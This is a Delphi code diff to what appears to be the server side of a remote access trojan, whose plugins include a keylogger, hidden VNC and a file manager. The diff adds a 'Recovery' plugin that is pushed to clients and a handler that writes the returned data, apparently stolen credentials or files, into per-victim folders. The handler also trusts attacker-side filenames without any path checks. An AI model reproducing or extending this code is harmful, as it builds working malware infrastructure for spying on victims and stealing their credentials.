@@ -15,7 +15,9 @@ uses
   UnitKeylogger,
   UnitOpenURL,
   UnitFileManager,
-  UnitHiddenVNC;
+  UnitHiddenVNC,
+  System.IOUtils,
+  System.NetEncoding;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
@@ -26,6 +28,7 @@ const
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
   HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
+  RECOVERY_PLUGIN_ID          = 'RecoveryPlugin';
 
   MAX_JSON_BUFFER_SIZE      = 128 * 1024 * 1024;
   PACKET_TYPE_JSON          = $01;
@@ -176,6 +179,7 @@ type
     procedure SendOpenURLPlugin(aLine: TncLine);
     procedure SendFileManagerPlugin(aLine: TncLine);
     procedure SendHiddenVNCPlugin(aLine: TncLine);
+    procedure SendRecoveryPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -988,6 +992,9 @@ begin SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID); end;
 procedure TServerManager.SendHiddenVNCPlugin(aLine: TncLine);
 begin SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID); end;
 
+procedure TServerManager.SendRecoveryPlugin(aLine: TncLine);
+begin SendPlugin(aLine, RECOVERY_PLUGIN_ID); end;
+
 { ---------------------------------------------------------------------- }
 {  Server Events                                                           }
 { ---------------------------------------------------------------------- }
@@ -1431,7 +1438,59 @@ begin
         else if SameText(PluginID, OPEN_URL_PLUGIN_ID)          then SendOpenURLPlugin(aLine)
         else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID)      then SendFileManagerPlugin(aLine)
         else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID)        then SendHiddenVNCPlugin(aLine)
+        else if SameText(PluginID, RECOVERY_PLUGIN_ID)          then SendRecoveryPlugin(aLine)
         else SendPlugin(aLine, PluginID);
+      end;
+      Exit;
+    end;
+
+    { ---- Recovery data ---- }
+    if Action = 'recovery_data' then
+    begin
+      var FileName := '';
+      var Content  := '';
+      var IsBase64 := False;
+
+      if Assigned(JSONObj.Values['filename']) then FileName := JSONObj.Values['filename'].Value;
+      if Assigned(JSONObj.Values['content'])  then Content  := JSONObj.Values['content'].Value;
+      if Assigned(JSONObj.Values['is_base64']) then IsBase64 := JSONObj.Values['is_base64'].Value.ToBoolean;
+
+      if (FileName <> '') and (Content <> '') then
+      begin
+        TThread.CreateAnonymousThread(
+          procedure
+          var
+            DirPath, FullPath: string;
+            Data: TBytes;
+            FileStream: TFileStream;
+          begin
+            DirPath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
+            DirPath := TPath.Combine(DirPath, Info.ID);
+            DirPath := TPath.Combine(DirPath, 'recovery');
+
+            try
+              if not TDirectory.Exists(DirPath) then
+                TDirectory.CreateDirectory(DirPath);
+
+              FullPath := TPath.Combine(DirPath, FileName);
+              if (Pos('/', FileName) > 0) or (Pos('\', FileName) > 0) then
+                 TDirectory.CreateDirectory(TPath.GetDirectoryName(FullPath.Replace('/', '\')));
+
+              if IsBase64 then
+                Data := TNetEncoding.Base64.DecodeStringToBytes(Content)
+              else
+                Data := TEncoding.UTF8.GetBytes(Content);
+
+              FileStream := TFileStream.Create(FullPath, fmCreate);
+              try
+                if Length(Data) > 0 then
+                  FileStream.WriteBuffer(Data[0], Length(Data));
+              finally
+                FileStream.Free;
+              end;
+            except
+            end;
+          end).Start;
       end;
       Exit;
     end;
